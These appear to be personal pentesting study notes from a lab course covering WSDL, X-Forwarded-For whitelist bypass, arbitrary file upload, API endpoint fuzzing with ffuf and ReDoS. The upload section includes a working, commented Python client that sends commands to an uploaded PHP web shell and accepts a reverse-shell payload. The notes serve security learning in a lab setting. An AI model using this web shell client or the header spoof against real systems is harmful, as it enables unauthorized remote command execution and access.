

### Web Services Description Language (WSDL)

[check here](https://www.tutorialworks.com/wsdl/#:~:text=A%20WSDL%20file%20is%20written%20in%20XML.%20It,to%20send%20a%20request%20to%20a%20web%20service.)

![[Pasted image 20240804173411.png]]

- instruction manual for interacting with a web service.
- defines rules t communicate btw application and web service 
## Structure of a WSDL file

|ELEMENT|WHAT IT DOES|
|---|---|
|`<types>`|Defines the data types (XML elements) that are used by the web service.|
|`<message>`|Defines the messages that can be exchanged with the web service. Each `<message>` contains a `<part>`.|
|`<portType>`|Defines each operation in the web service, and the messages associated with each operation.|
|`<binding>`|Defines exactly how each `operation` will take place over the network (we use SOAP, in the example below).|
|`<service>`|Defines the physical location of the service (e.g. its _endpoint_).|


- bruteforce to find wsdl directory
- blank page brute force for parameters
### Rate Limit Bypass

```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```
- set X-FORWARD-HEADER to one in the list of whitelist
- if blacklisted do it accordingly

## ARBITRARY FILE UPLOAD

```shell-session
python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
```


```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```


- ==api end points == [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt)

```shell-session
 ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```
# Regular Expression Denial of Service (ReDoS)

- user input processed by regx on server side
- lower input in api lower time taken
- higher input size time taken long

regex to [regex101.com](https://regex101.com/) for an in-depth explanation. Then, submit the above regex to [https://jex.im/regulex/](https://jex.im/regulex/#!flags=&re=%5E(%5Ba-zA-Z0-9_.-%5D) for a visualization



